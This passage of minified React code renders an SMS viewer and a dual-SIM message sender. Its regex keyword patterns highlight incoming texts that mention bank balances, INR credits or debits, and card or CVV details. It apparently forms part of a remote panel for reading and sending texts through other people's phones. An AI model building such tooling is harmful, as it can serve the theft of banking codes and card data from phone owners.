                            className: "absolute right-3 top-1/2 -translate-y-1/2 w-6 h-6 rounded-full text-[#777] hover:text-orange-600 hover:bg-orange-50 transition-all",
                            "aria-label": "Clear SMS search",
                            children: "×"
                        })]
                    }), r.jsx("div", {
                        className: "flex-1 overflow-y-auto px-4 py-3 space-y-2",
                        children: T ? r.jsxs("div", {
                            className: "py-12 text-center",
                            children: [r.jsx("div", {
                                className: "w-6 h-6 border-2 border-[#333] border-t-red-500 rounded-full animate-spin mx-auto mb-3"
                            }), r.jsx("p", {
                                className: "text-xs text-[#555]",
                                children: "Loading messages…"
                            })]
                        }) : p.length === 0 ? r.jsxs("div", {
                            className: "py-12 text-center",
                            children: [r.jsx(hp, {
                                className: "w-10 h-10 mx-auto mb-3 text-[#2a2a2a]"
                            }), r.jsx("p", {
                                className: "text-sm font-medium text-[#444]",
                                children: "No messages"
                            })]
                        }) : filteredSms.length === 0 ? r.jsxs("div", {
                            className: "py-12 text-center",
                            children: [r.jsx(xp, {
                                className: "w-10 h-10 mx-auto mb-3 text-[#b5aea5]"
                            }), r.jsx("p", {
                                className: "text-sm font-medium text-[#555]",
                                children: "No matching messages"
                            }), r.jsx("p", {
                                className: "text-xs text-[#777] mt-1",
                                children: "Try a sender name, phone number or amount"
                            })]
                        }) : filteredSms.map((c, I) => {
                            const Z = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(c.text),
                                q = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(c.text),
                                mt = q ? "border-l-purple-600/60" : Z ? "border-l-emerald-600/60" : "border-l-red-600/60",
                                it = q ? "bg-[#100d18]" : Z ? "bg-[#0a130d]" : "bg-[#111]",
                                bt = q ? "text-purple-400" : Z ? "text-emerald-400" : "text-red-400";
                            return r.jsxs("div", {
                                className: `p-3 rounded-xl border border-[#1e1e1e] border-l-2 ${mt} ${it}`,
                                children: [r.jsxs("div", {
                                    className: "flex items-center justify-between mb-2",
                                    children: [r.jsxs("div", {
                                        className: "flex items-center gap-1.5",
                                        children: [r.jsx("span", {
                                            className: `text-xs font-bold ${bt}`,
                                            children: c.sender
                                        }), Z && r.jsx($l, {
                                            className: "w-3 h-3 text-emerald-600/70"
                                        }), q && r.jsx(Wl, {
                                            className: "w-3 h-3 text-purple-600/70"
                                        })]
                                    }), r.jsxs("div", { className:"sms-card-actions", children:[r.jsx("span", {
                                        className: "text-[10px] text-[#444] font-mono",
                                        children: c.time
                                    }), r.jsx("button", { type:"button", className:"sms-copy-one", onClick:()=>copySmsText(c.text || ""), title:"Copy message text only", "aria-label":"Copy message text only", children:"Copy" })] })]
                                }), r.jsx("p", {
                                    className: "text-xs text-[#aaa] leading-relaxed",
                                    children: c.text
                                })]
                            }, I)
                        })
                    })]
                }), H === "send" && r.jsxs("div", {
                    className: "tab-panel tab-panel--send px-5 py-4 space-y-4",
                    children: [r.jsx("button", {
                        type: "button",
                        onClick: d,
                        className: "send-composer-close",
                        title: "Close panel",
                        "aria-label": "Close panel",
                        children: "×"
                    }), r.jsxs("div", {
                        children: [r.jsx("p", {
                            className: "text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2",
                            children: "Select SIM"
                        }), r.jsx("div", {
                            className: "flex gap-2",
                            children: [1, 2].map(c => r.jsxs("button", {
                                onClick: () => N(c),
                                className: `flex-1 py-2.5 rounded-xl text-sm font-bold transition-all ${z===c?"bg-red-600 text-white shadow-lg shadow-red-900/40":"bg-[#111] border border-[#222] text-[#666] hover:border-[#333] hover:text-[#888]"}`,
                                children: ["SIM ", c]
                            }, c))
                        })]
                    }), r.jsxs("div", {
                        children: [r.jsx("p", {
                            className: "text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2",
                            children: "Recipient"
                        }), r.jsxs("div", {
                            className: "clearable-field",
                            children: [r.jsx("input", {
                                type: "tel",
                                inputMode: "tel",
                                autoComplete: "off",
                                autoFocus: !C,
                                value: C,
                                onChange: c => v(c.target.value),
                                placeholder: "Enter recipient number",
                                "aria-label": "Recipient phone number",
                                className: "w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-red-600/50 focus:ring-1 focus:ring-red-600/20 outline-none text-sm text-white placeholder:text-[#444] font-mono transition-all"
                            }), C && r.jsx("button", {
                                type: "button",
                                className: "field-clear-button",
                                onClick: () => v(""),
                                "aria-label": "Clear recipient",
                                children: "×"
                            })]
                        })]
                    }), r.jsxs("div", {
                        children: [r.jsx("p", {
                            className: "text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2",
                            children: "Message"
                        }), r.jsxs("div", {
                            className: "clearable-field",
                            children: [r.jsx("textarea", {
                                autoFocus: !!C,
                                value: E,
                                onChange: c => g(c.target.value),
                                rows: 4,
                                placeholder: "Write your message manually…",
                                "aria-label": "Message text",
                                className: "w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-red-600/50 focus:ring-1 focus:ring-red-600/20 outline-none text-sm text-white placeholder:text-[#444] resize-none transition-all"
                            }), E && r.jsx("button", {
                                type: "button",
                                className: "field-clear-button",
                                onClick: () => g(""),
                                "aria-label": "Clear message",
                                children: "×"
                            })]
                        }), r.jsxs("p", {
                            className: "text-[10px] text-[#444] mt-1 text-right",
                            children: [E.length, " chars"]
                        })]
                    }), r.jsxs("button", {
                        onClick: () => ot(z),
                        disabled: k,
                        title: "Send your manually written message",
                        className: "desktop-send-button w-full flex items-center justify-center gap-2 py-3.5 rounded-xl bg-red-600 hover:bg-red-700 text-white font-bold text-sm shadow-lg shadow-red-900/40 transition-all disabled:opacity-50 disabled:cursor-not-allowed",
                        children: [k ? r.jsx("div", {
                            className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
                        }) : r.jsx(Sp, {
                            className: "w-4 h-4"
                        }), k ? "Sending…" : `Send via SIM ${z}`]
                    }), r.jsx("div", {
                        className: "mobile-sim-send-actions",
                        children: [1, 2].map(c => r.jsxs("button", {
                            onClick: () => ot(c),
                            disabled: k,
                            title: `Send with SIM ${c}`,
                            className: `flex items-center justify-center gap-1.5 rounded-xl bg-red-600 hover:bg-red-700 text-white font-bold shadow-lg shadow-red-900/40 transition-all disabled:opacity-50 disabled:cursor-not-allowed ${sendingSim===c?"sending":""}`,
                            children: [sendingSim === c ? r.jsx("div", {
                                className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
                            }) : r.jsx(Sp, {
                                className: "w-4 h-4"
                            }), sendingSim === c ? "Sending…" : `Send SIM ${c}`]
                        }, c))
                    })]
                })]
            })]
        })]
    })
}

function h1({
    message: A,
    onDismiss: tt
}) {
    return r.jsxs("div", {
        className: "flex items-start gap-3 px-4 py-3 bg-red-950/40 border border-red-900/30 rounded-xl mx-6 mt-3",
        children: [r.jsx(kp, {
            className: "w-4 h-4 text-red-400 flex-shrink-0 mt-0.5"
        }), r.jsx("p", {
            className: "text-xs text-red-300 flex-1 leading-relaxed",
            children: A
        }), r.jsx("button", {
            onClick: tt,
            className: "text-red-600 hover:text-red-400 flex-shrink-0",
            children: r.jsx(nl, {
                className: "w-3.5 h-3.5"
            })
        })]
    })
}

function m1() {
    return r.jsxs("div", {
        className: "bg-[#111111] border border-[#1f1f1f] rounded-2xl p-4 animate-pulse",
        children: [r.jsxs("div", {
            className: "flex items-start gap-3 mb-3",
            children: [r.jsx("div", {
                className: "w-10 h-10 rounded-xl bg-[#1a1a1a]"
            }), r.jsxs("div", {
                className: "flex-1 space-y-2",
                children: [r.jsx("div", {
                    className: "h-3 bg-[#1a1a1a] rounded w-3/4"
                }), r.jsx("div", {
                    className: "h-2 bg-[#151515] rounded w-1/2"
                })]
            })]
        }), r.jsxs("div", {
            className: "grid grid-cols-2 gap-3 mb-3",
            children: [r.jsx("div", {
                className: "h-8 bg-[#151515] rounded-xl"
            }), r.jsx("div", {
                className: "h-8 bg-[#151515] rounded-xl"
            })]
        }), r.jsx("div", {
            className: "h-10 bg-[#131313] rounded-xl"
        })]
    })
}

